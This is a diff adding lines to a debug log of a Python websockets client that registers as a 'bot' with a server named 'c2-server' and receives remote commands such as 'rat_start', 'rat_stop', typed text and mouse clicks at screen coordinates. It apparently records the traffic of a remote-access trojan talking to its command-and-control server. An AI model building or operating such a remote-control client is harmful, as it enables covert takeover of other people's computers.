@@ -237,3 +237,118 @@
 2026-08-22 18:56:21,674 - DEBUG - = connection is CLOSED
 2026-08-22 18:56:21,674 - DEBUG - x closing TCP connection
 2026-08-22 18:56:21,676 - ERROR - Stream error: sent 1000 (OK); then received 1000 (OK)
+2026-08-22 19:10:31,707 - DEBUG - Using proactor: IocpProactor
+2026-08-22 19:10:31,770 - DEBUG - = connection is CONNECTING
+2026-08-22 19:10:31,822 - DEBUG - > GET /ws HTTP/1.1
+2026-08-22 19:10:31,822 - DEBUG - > Host: c2-server-exj9.onrender.com
+2026-08-22 19:10:31,822 - DEBUG - > Upgrade: websocket
+2026-08-22 19:10:31,822 - DEBUG - > Connection: Upgrade
+2026-08-22 19:10:31,822 - DEBUG - > Sec-WebSocket-Key: o5nZncgTEkdvDTtRRF5OeA==
+2026-08-22 19:10:31,822 - DEBUG - > Sec-WebSocket-Version: 13
+2026-08-22 19:10:31,822 - DEBUG - > Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
+2026-08-22 19:10:31,822 - DEBUG - > User-Agent: Python/3.11 websockets/17.0.1
+2026-08-22 19:10:32,058 - DEBUG - < HTTP/1.1 101 Switching Protocols
+2026-08-22 19:10:32,059 - DEBUG - < Date: Sat, 22 Aug 2026 12:10:10 GMT
+2026-08-22 19:10:32,059 - DEBUG - < Connection: upgrade
+2026-08-22 19:10:32,059 - DEBUG - < Upgrade: websocket
+2026-08-22 19:10:32,059 - DEBUG - < Sec-WebSocket-Accept: ABL0vTNfRMMYoviN4JQ09zIKxEo=
+2026-08-22 19:10:32,059 - DEBUG - < cf-cache-status: DYNAMIC
+2026-08-22 19:10:32,059 - DEBUG - < Server: cloudflare
+2026-08-22 19:10:32,059 - DEBUG - < CF-RAY: a2f1c5d92dc27558-HKG
+2026-08-22 19:10:32,059 - DEBUG - < alt-svc: h3=":443"; ma=86400
+2026-08-22 19:10:32,059 - DEBUG - = connection is OPEN
+2026-08-22 19:10:32,059 - DEBUG - > TEXT '{"type": "register", "bot_id": "5fe26132-ec6a-4... "screen_height": 1080}' [196 bytes]
+2026-08-22 19:10:32,060 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400632.0601125}' [104 bytes]
+2026-08-22 19:10:33,701 - DEBUG - < TEXT '{"type":"registered","bot_id":"5fe26132-ec6a-4e15-8a9f-6183f82b2d07"}' [69 bytes]
+2026-08-22 19:10:33,701 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...mp": 1787400633.701162}' [103 bytes]
+2026-08-22 19:10:45,801 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006...and":"ping","args":[]}}' [91 bytes]
+2026-08-22 19:10:45,801 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400623800-bb0..."50ms", "status": "ok"}' [88 bytes]
+2026-08-22 19:10:45,802 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400645.8029385}' [104 bytes]
+2026-08-22 19:10:52,063 - DEBUG - > PING 49 85 ba ff [binary, 4 bytes]
+2026-08-22 19:10:52,064 - DEBUG - % sent keepalive ping
+2026-08-22 19:10:52,134 - DEBUG - < PONG 49 85 ba ff [binary, 4 bytes]
+2026-08-22 19:10:52,134 - DEBUG - % received keepalive pong
+2026-08-22 19:10:58,421 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006..."rat_start","args":[]}}' [96 bytes]
+2026-08-22 19:10:58,422 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400637216-039...arted", "status": "ok"}' [95 bytes]
+2026-08-22 19:10:58,422 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400658.4226336}' [104 bytes]
+2026-08-22 19:11:09,897 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006...","args":["hihi hih"]}}' [108 bytes]
+2026-08-22 19:11:11,580 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400648693-544...chars", "status": "ok"}' [113 bytes]
+2026-08-22 19:11:11,580 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400671.5802703}' [104 bytes]
+2026-08-22 19:11:12,062 - DEBUG - > PING 5f bc 8b 5e [binary, 4 bytes]
+2026-08-22 19:11:12,062 - DEBUG - % sent keepalive ping
+2026-08-22 19:11:12,133 - DEBUG - < PONG 5f bc 8b 5e [binary, 4 bytes]
+2026-08-22 19:11:12,133 - DEBUG - % received keepalive pong
+2026-08-22 19:11:23,179 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006...doubleclick",151,100]}}' [117 bytes]
+2026-08-22 19:11:23,283 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400661973-05f... sent", "status": "ok"}' [101 bytes]
+2026-08-22 19:11:23,284 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400683.2844608}' [104 bytes]
+2026-08-22 19:11:31,968 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006..."rightclick",190,120]}}' [116 bytes]
+2026-08-22 19:11:32,172 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400670763-cdf... sent", "status": "ok"}' [100 bytes]
+2026-08-22 19:11:32,172 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400692.1726432}' [104 bytes]
+2026-08-22 19:11:32,172 - DEBUG - > PING 03 27 a5 99 [binary, 4 bytes]
+2026-08-22 19:11:32,174 - DEBUG - % sent keepalive ping
+2026-08-22 19:11:32,277 - DEBUG - < PONG 03 27 a5 99 [binary, 4 bytes]
+2026-08-22 19:11:32,277 - DEBUG - % received keepalive pong
+2026-08-22 19:11:37,272 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006...:"rat_stop","args":[]}}' [95 bytes]
+2026-08-22 19:11:37,272 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400676066-823...opped", "status": "ok"}' [95 bytes]
+2026-08-22 19:11:37,273 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...amp": 1787400697.27313}' [102 bytes]
+2026-08-22 19:11:39,930 - DEBUG - < TEXT '{"type":"command","payload":{"cmd_id":"17874006..."rat_start","args":[]}}' [96 bytes]
+2026-08-22 19:11:39,931 - DEBUG - > TEXT '{"type": "result", "cmd_id": "1787400678724-45b...arted", "status": "ok"}' [95 bytes]
+2026-08-22 19:11:39,931 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...mp": 1787400699.931254}' [103 bytes]
+2026-08-22 19:11:52,174 - DEBUG - > PING 2e ec 7f 83 [binary, 4 bytes]
+2026-08-22 19:11:52,174 - DEBUG - % sent keepalive ping
+2026-08-22 19:11:52,249 - DEBUG - < PONG 2e ec 7f 83 [binary, 4 bytes]
+2026-08-22 19:11:52,249 - DEBUG - % received keepalive pong
+2026-08-22 19:12:09,942 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400729.9419506}' [104 bytes]
+2026-08-22 19:12:12,191 - DEBUG - > PING 2a cc 4e 72 [binary, 4 bytes]
+2026-08-22 19:12:12,192 - DEBUG - % sent keepalive ping
+2026-08-22 19:12:12,261 - DEBUG - < PONG 2a cc 4e 72 [binary, 4 bytes]
+2026-08-22 19:12:12,261 - DEBUG - % received keepalive pong
+2026-08-22 19:12:32,203 - DEBUG - > PING 69 da 30 08 [binary, 4 bytes]
+2026-08-22 19:12:32,203 - DEBUG - % sent keepalive ping
+2026-08-22 19:12:32,275 - DEBUG - < PONG 69 da 30 08 [binary, 4 bytes]
+2026-08-22 19:12:32,275 - DEBUG - % received keepalive pong
+2026-08-22 19:12:39,960 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400759.9603913}' [104 bytes]
+2026-08-22 19:12:52,199 - DEBUG - > PING b5 03 56 e2 [binary, 4 bytes]
+2026-08-22 19:12:52,199 - DEBUG - % sent keepalive ping
+2026-08-22 19:12:52,271 - DEBUG - < PONG b5 03 56 e2 [binary, 4 bytes]
+2026-08-22 19:12:52,271 - DEBUG - % received keepalive pong
+2026-08-22 19:13:09,970 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...estamp": 1787400789.97}' [99 bytes]
+2026-08-22 19:13:12,212 - DEBUG - > PING a7 3b ac 90 [binary, 4 bytes]
+2026-08-22 19:13:12,212 - DEBUG - % sent keepalive ping
+2026-08-22 19:13:20,617 - DEBUG - < EOF
+2026-08-22 19:13:20,617 - DEBUG - > EOF
+2026-08-22 19:13:20,617 - DEBUG - = connection is CLOSED
+2026-08-22 19:13:20,618 - DEBUG - x closing TCP connection
+2026-08-22 19:13:20,660 - DEBUG - = connection is CONNECTING
+2026-08-22 19:13:20,714 - DEBUG - > GET /ws HTTP/1.1
+2026-08-22 19:13:20,715 - DEBUG - > Host: c2-server-exj9.onrender.com
+2026-08-22 19:13:20,715 - DEBUG - > Upgrade: websocket
+2026-08-22 19:13:20,715 - DEBUG - > Connection: Upgrade
+2026-08-22 19:13:20,715 - DEBUG - > Sec-WebSocket-Key: r3mqZiAAHPipbx/P1vGiFg==
+2026-08-22 19:13:20,715 - DEBUG - > Sec-WebSocket-Version: 13
+2026-08-22 19:13:20,715 - DEBUG - > Sec-WebSocket-Extensions: permessage-deflate; client_max_window_bits
+2026-08-22 19:13:20,715 - DEBUG - > User-Agent: Python/3.11 websockets/17.0.1
+2026-08-22 19:13:20,943 - DEBUG - < HTTP/1.1 101 Switching Protocols
+2026-08-22 19:13:20,944 - DEBUG - < Date: Sat, 22 Aug 2026 12:12:59 GMT
+2026-08-22 19:13:20,944 - DEBUG - < Connection: upgrade
+2026-08-22 19:13:20,944 - DEBUG - < Upgrade: websocket
+2026-08-22 19:13:20,944 - DEBUG - < Sec-WebSocket-Accept: 3nQcZgXEC4QxBHh26f5JklBbrAc=
+2026-08-22 19:13:20,944 - DEBUG - < cf-cache-status: DYNAMIC
+2026-08-22 19:13:20,944 - DEBUG - < Server: cloudflare
+2026-08-22 19:13:20,944 - DEBUG - < CF-RAY: a2f1c9f8bdd9d173-HKG
+2026-08-22 19:13:20,944 - DEBUG - < alt-svc: h3=":443"; ma=86400
+2026-08-22 19:13:20,944 - DEBUG - = connection is OPEN
+2026-08-22 19:13:20,945 - DEBUG - > TEXT '{"type": "register", "bot_id": "5fe26132-ec6a-4... "screen_height": 1080}' [196 bytes]
+2026-08-22 19:13:20,945 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...mp": 1787400800.945134}' [103 bytes]
+2026-08-22 19:13:21,011 - DEBUG - < TEXT '{"type":"registered","bot_id":"5fe26132-ec6a-4e15-8a9f-6183f82b2d07"}' [69 bytes]
+2026-08-22 19:13:21,012 - DEBUG - > TEXT '{"type": "heartbeat", "bot_id": "5fe26132-ec6a-...p": 1787400801.0127227}' [104 bytes]
+2026-08-22 19:13:40,961 - DEBUG - > PING a3 6b 67 5a [binary, 4 bytes]
+2026-08-22 19:13:40,961 - DEBUG - % sent keepalive ping
+2026-08-22 19:13:41,025 - DEBUG - < PONG a3 6b 67 5a [binary, 4 bytes]
+2026-08-22 19:13:41,025 - DEBUG - % received keepalive pong
+2026-08-22 19:13:41,035 - DEBUG - > CLOSE 1000 (OK) [2 bytes]
+2026-08-22 19:13:41,035 - DEBUG - = connection is CLOSING
+2026-08-22 19:13:41,100 - DEBUG - < CLOSE 1000 (OK) [2 bytes]
+2026-08-22 19:13:41,101 - DEBUG - > EOF
+2026-08-22 19:13:41,101 - DEBUG - = connection is CLOSED
+2026-08-22 19:13:41,101 - DEBUG - x closing TCP connection
